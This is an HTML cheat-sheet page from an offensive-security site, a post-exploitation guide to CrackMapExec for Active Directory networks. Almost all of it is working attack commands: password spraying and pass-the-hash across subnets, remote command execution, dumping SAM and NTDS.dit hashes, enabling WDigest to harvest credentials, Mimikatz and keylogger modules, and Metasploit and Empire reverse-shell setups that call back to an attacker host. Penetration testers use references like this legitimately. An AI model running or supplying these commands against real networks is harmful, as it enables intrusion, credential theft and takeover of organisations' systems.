<!DOCTYPE html>
<html>
  <head>
    <title>Exploit-me.com - CheatSheet</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2022-04-07T22:44:25 CEST">
<title>CrackMapExec (a.k.a CME)  :: Exploit-me.com - CheatSheet</title>
<link rel="shortcut icon" href="/cheatsheet/images/favicon.png" type="image/x-icon" />
<link href="/cheatsheet/css/nucleus.css" rel="stylesheet">
<link href="/cheatsheet/css/font-awesome.min.css" rel="stylesheet">
<link href="/cheatsheet/css/featherlight.min.css" rel="stylesheet">
<link href="/cheatsheet/css/auto-complete.css" rel="stylesheet">
<link href="/cheatsheet/theme-flex/style.css" rel="stylesheet">

<link rel="stylesheet" href="/cheatsheet/css/bootstrap.min.css">
<meta name="description" content="A Guide to CrackMapExec.A post-exploitation tool for Active Directory networks.">



    
  </head>
  <body data-url="/cheatsheet/blog/crackmapexec/">
    
      <header>
  <div class="logo">
    
	
  
    <a class="baselink" href="/cheatsheet/">Exploit-me.com - CheatSheet</a>
  


  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://exploit-me.com/"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Exploit-Me - Home</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
    <li data-nav-id="/cheatsheet/about/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/about/">Abouts</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/about/naveed/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/naveed/">
            Naveed
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/about/hbkhan/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/hbkhan/">
            Hbkhan
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/about/asif/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/asif/">
            Khanisgr8
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/cheatsheet/blog/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/blog/">Blogs</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/blog/crackmapexec/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/crackmapexec/">
            CrackMapExec (a.k.a CME) 
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/windows-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/windows-privilege-escalation/">
            Windows Privilege Escalation.
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/linux-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/linux-privilege-escalation/">
            Linux Privilege Escalation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>




    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/cheatsheet/about/" >
   Abouts</option>
    <option value="/cheatsheet/blog/" >
   Blogs</option> 
      <option value="/cheatsheet/blog/crackmapexec/"  selected>- CrackMapExec (a.k.a CME) </option>
      <option value="/cheatsheet/blog/windows-privilege-escalation/" >- Windows Privilege Escalation.</option>
      <option value="/cheatsheet/blog/linux-privilege-escalation/" >- Linux Privilege Escalation</option>
  



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
      </div>
    

    <h1>CrackMapExec (a.k.a CME) </h1>
    
    
    
    <h1 id="crackmapexec">CrackMapExec</h1>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># General help</span>
crackmapexec --help

<span style="color:#75715e"># Protocol help</span>
cracmapexec smb --help
</code></pre></div><h3 id="connections--spraying">Connections &amp; Spraying</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Target format</span>
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Null session</span>
crackmapexec smb 192.168.10.1 -u <span style="color:#d88200">&#34;&#34;</span> up <span style="color:#d88200">&#34;&#34;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Connect to target using local account</span>
crackmapexec smb 192.168.215.138 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASSWORD&#39;</span> --local-auth
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Pass the hash against a subnet</span>
crackmapexec smb 172.16.157.0/24 -u administrator -H <span style="color:#d88200">&#39;LMHASH:NTHASH&#39;</span> --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H <span style="color:#d88200">&#39;NTHASH&#39;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Bruteforcing and Password Spraying</span>
crackmapexec smb 192.168.100.0/24 -u <span style="color:#d88200">&#34;admin&#34;</span> -p <span style="color:#d88200">&#34;password1&#34;</span>
crackmapexec smb 192.168.100.0/24 -u <span style="color:#d88200">&#34;admin&#34;</span> -p <span style="color:#d88200">&#34;password1&#34;</span> <span style="color:#d88200">&#34;password2&#34;</span>
crackmapexec smb 192.168.100.0/24 -u <span style="color:#d88200">&#34;admin1&#34;</span> <span style="color:#d88200">&#34;admin2&#34;</span> -p <span style="color:#d88200">&#34;P@ssword&#34;</span>
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
</code></pre></div><h3 id="enumeration">Enumeration</h3>
<h4 id="users">Users</h4>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Enumerate users</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --users

<span style="color:#75715e"># Perform RID Bruteforce to get users</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --rid-brute

<span style="color:#75715e"># Enumerate domain groups</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --groups

<span style="color:#75715e"># Enumerate local users</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --local-users
</code></pre></div><h4 id="hosts">Hosts</h4>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Generate a list of relayable hosts (SMB Signing disabled)</span>
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

<span style="color:#75715e"># Enumerate available shares</span>
crackmapexec smb 192.168.215.138 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASSWORD&#39;</span> --local-auth --shares

<span style="color:#75715e"># Get the active sessions</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --sessions

<span style="color:#75715e"># Check logged in users</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --lusers

<span style="color:#75715e"># Get the password policy</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;user&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --pass-pol
</code></pre></div><h3 id="execution--co">Execution &amp; Co</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># CrackMapExec has 3 different command execution methods (in default order) :</span>
<span style="color:#75715e"># - wmiexec --&gt; WMI</span>
<span style="color:#75715e"># - atexec --&gt; scheduled task</span>
<span style="color:#75715e"># - smbexec --&gt; creating and running a service</span>

<span style="color:#75715e"># Execute command through cmd.exe (admin privileges required)</span>
crackmapexec smb 192.168.10.11 -u Administrator -p <span style="color:#d88200">&#39;P@ssw0rd&#39;</span> -x <span style="color:#d88200">&#39;whoami&#39;</span>

<span style="color:#75715e"># Force the smbexec method</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> -x <span style="color:#d88200">&#39;net user Administrator /domain&#39;</span> --exec-method smbexec

<span style="color:#75715e"># Execute commands through PowerShell (admin privileges required)</span>
crackmapexec smb 192.168.10.11 -u Administrator -p <span style="color:#d88200">&#39;P@ssw0rd&#39;</span> -X <span style="color:#d88200">&#39;whoami&#39;</span>
</code></pre></div><h3 id="getting-credentials">Getting Credentials</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Dump local SAM hashes</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --local-auth --sam
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Enable or disable WDigest to get credentials from the LSA Memory</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --local-auth --wdigest <span style="color:#111">enable</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --local-auth --wdigest disable

<span style="color:#75715e"># Then you juste have to wait the user logoff and logon again</span>
<span style="color:#75715e"># But you can force the logoff</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> -x <span style="color:#d88200">&#39;quser&#39;</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> -x <span style="color:#d88200">&#39;logoff &lt;sessionid&gt;&#39;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Dump the NTDS.dit from DC using methods from secretsdump.py</span>

<span style="color:#75715e"># Uses drsuapi RPC interface create a handle, trigger replication</span>
<span style="color:#75715e"># and combined with additional drsuapi calls to convert the resultant </span>
<span style="color:#75715e"># linked-lists into readable format</span>
crackmapexec smb 192.168.1.100 -u UserNAme -p <span style="color:#d88200">&#39;PASSWORDHERE&#39;</span> --ntds

<span style="color:#75715e"># Uses the Volume Shadow copy Service</span>
crackmapexec smb 192.168.1.100 -u UserNAme -p <span style="color:#d88200">&#39;PASSWORDHERE&#39;</span> --ntds vss

<span style="color:#75715e"># Dump the NTDS.dit password history</span>
smb 192.168.1.0/24 -u UserNAme -p <span style="color:#d88200">&#39;PASSWORDHERE&#39;</span> --ntds-history
</code></pre></div><h3 id="using-the-database">Using the database</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># The database automatically store every hosts reaches by CME and all credentials with admin access</span>
$ cmedb

<span style="color:#75715e"># Using workspaces</span>
cmedb&gt; workspace create <span style="color:#111">test</span>
cmedb&gt; workspace <span style="color:#111">test</span>

<span style="color:#75715e"># Access a protocol database and switch back</span>
cmedb <span style="color:#f92672">(</span><span style="color:#111">test</span><span style="color:#f92672">)</span>&gt; proto smb
cmedb <span style="color:#f92672">(</span><span style="color:#111">test</span><span style="color:#f92672">)</span>&gt; back

<span style="color:#75715e"># List stored hosts</span>
cmedb&gt; hosts

<span style="color:#75715e"># View detailed infos for a specific machine (including creds)</span>
cmedb&gt; hosts &lt;hostname&gt;

<span style="color:#75715e"># Get stored credentials</span>
cmedb&gt; creds

<span style="color:#75715e"># Get credentials access for a specific account</span>
cmedb&gt; creds &lt;username&gt;

<span style="color:#75715e"># Using credentials from the database</span>
crackmapexec smb 192.168.100.1 -id &lt;credsID&gt;
</code></pre></div><h3 id="modules">Modules</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># List available modules</span>
crackmapexec smb -L

<span style="color:#75715e"># Module information</span>
crackmapexec smb -M mimikatz --module-info

<span style="color:#75715e"># View module options</span>
crackmapexec smb -M mimikatz --options

<span style="color:#75715e"># Mimikatz module</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p <span style="color:#d88200">&#39;P@ssw0rd&#39;</span> -M mimikatz -o <span style="color:#111">COMMAND</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;privilege::debug&#39;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Get-ComputerDetails       Enumerates sysinfo
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers<span style="color:#8045ff">\&#39;</span> machine
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> empire_exec               Uses Empire<span style="color:#8045ff">\&#39;</span>s RESTful API to generate a launcher <span style="color:#00a8c8">for</span> the specified listener and executes it
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> via WMI
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> enum_dns                  Uses WMI to dump DNS from an AD DNS Server
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> get_keystrokes            Logs keys pressed, <span style="color:#111">time</span> and the active window
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> get_netdomaincontroller   Enumerates all domain controllers
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> get_netrdpsession         Enumerates all active RDP sessions
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> get_timedscreenshot       Takes screenshots at a regular interval
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> gpp_autologin             Searches the domain controller <span style="color:#00a8c8">for</span> registry.xml to find autologon information and returns the username and password.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> gpp_password              Retrieves the plaintext password and other information <span style="color:#00a8c8">for</span> accounts pushed through Group Policy Preferences.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> invoke_sessiongopher      Digs up saved session information <span style="color:#00a8c8">for</span> PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> invoke_vnc                Injects a VNC client in memory
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> met_inject                Downloads the Meterpreter stager and injects it into memory
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mimikatz                  Dumps all logon credentials from memory
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mimikittenz               Executes Mimikittenz
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> multirdp                  Patches terminal services in memory to allow multiple RDP users
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> netripper                 Capture<span style="color:#d88200">`</span><span style="color:#8045ff">\&#39;</span>s credentials by using API hooking
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pe_inject                 Downloads the specified DLL/EXE and injects it into memory
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rdp                       Enables/Disables RDP
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> shellcode_inject          Downloads the specified raw shellcode and injects it into memory
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> test_connection           Pings a host
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> tokens                    Enumerates available tokens
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> uac                       Checks UAC status
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> wdigest                   Creates/Deletes the <span style="color:#d88200">&#39;UseLogonCredential&#39;</span> registry key enabling WDigest cred dumping on Windows &gt;<span style="color:#f92672">=</span> 8.1
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
</code></pre></div><h3 id="getting-shells">Getting shells</h3>
<h4 id="metasploit">Metasploit</h4>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># First, set up a HTTP Reverse Handler</span>
msf &gt; use exploit/multi/handler 
msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> payload windows/meterpreter/reverse_https
msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LHOST 192.168.10.3
msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> exitonsession <span style="color:#111">false</span>
msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; exploit -j

<span style="color:#75715e"># Met_Inject module</span>
crackmapexec smb 192.168.215.104 -u <span style="color:#d88200">&#39;Administrator&#39;</span> -p <span style="color:#d88200">&#39;PASS&#39;</span> --local-auth -M met_inject -o <span style="color:#111">LHOST</span><span style="color:#f92672">=</span>YOURIP <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> 
</code></pre></div><h4 id="empire">Empire</h4>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Start RESTful API</span>
empire --rest --user empireadmin --pass gH25Iv1K68@^

<span style="color:#75715e"># First setup an Empire HTTP listener</span>
<span style="color:#f92672">(</span>Empire: listeners<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> Name <span style="color:#111">test</span>
<span style="color:#f92672">(</span>Empire: listeners<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> Host 192.168.10.3
<span style="color:#f92672">(</span>Empire: listeners<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> Port <span style="color:#ae81ff">9090</span>
<span style="color:#f92672">(</span>Empire: listeners<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> CertPath data/empire.pem
<span style="color:#f92672">(</span>Empire: listeners<span style="color:#f92672">)</span> &gt; run
<span style="color:#f92672">(</span>Empire: listeners<span style="color:#f92672">)</span> &gt; list

<span style="color:#75715e"># Start RESTful API</span>
<span style="color:#75715e"># The username and password that CME uses to authenticate to Empire&#39;s RESTful API </span>
<span style="color:#75715e"># Are stored in the cme.conf file located at ~/.cme/cme.conf</span>
empire --rest --user empireadmin --pass gH25Iv1K68@^

<span style="color:#75715e"># Empire Module</span>
crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o <span style="color:#111">LISTENER</span><span style="color:#f92672">=</span>CMETest
</code></pre></div>

    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/cheatsheet/blog/" title="Blogs"> <i class="fa fa-chevron-left"></i><label>Blogs</label></a>
    <a class="nav nav-next" href="/cheatsheet/blog/windows-privilege-escalation/" title="Windows Privilege Escalation." style="margin-right: 0px;"><label>Windows Privilege Escalation.</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    
    <div class="tags"> 
      
        <a class="label label-default" href="/cheatsheet/tags/offensive">offensive</a>
      
        <a class="label label-default" href="/cheatsheet/tags/post-exploitation">post-exploitation</a>
      
        <a class="label label-default" href="/cheatsheet/tags/crackmapexec">crackmapexec</a>
      
        <a class="label label-default" href="/cheatsheet/tags/active-directory">Active-Directory</a>
      
    </div>
    

    

    
    <div class="date">
        <i class='fa fa-calendar'></i> Last update on 07/04/2022
    </div>
    

    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/cheatsheet/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
    
        var baseurl = "\/cheatsheet\/";
    
</script>
<script src="/cheatsheet/js/clipboard.min.js"></script>
<script src="/cheatsheet/js/featherlight.min.js"></script>

<script type="text/javascript" src="/cheatsheet/js/lunr.min.js"></script>
<script type="text/javascript" src="/cheatsheet/js/auto-complete.js"></script>
<script type="text/javascript" src="/cheatsheet/js/search.js"></script>
<script src="/cheatsheet/theme-flex/script.js"></script>




<script src="/cheatsheet/js/scripts.min.js"></script>
    

    
    

    
  </body>
</html>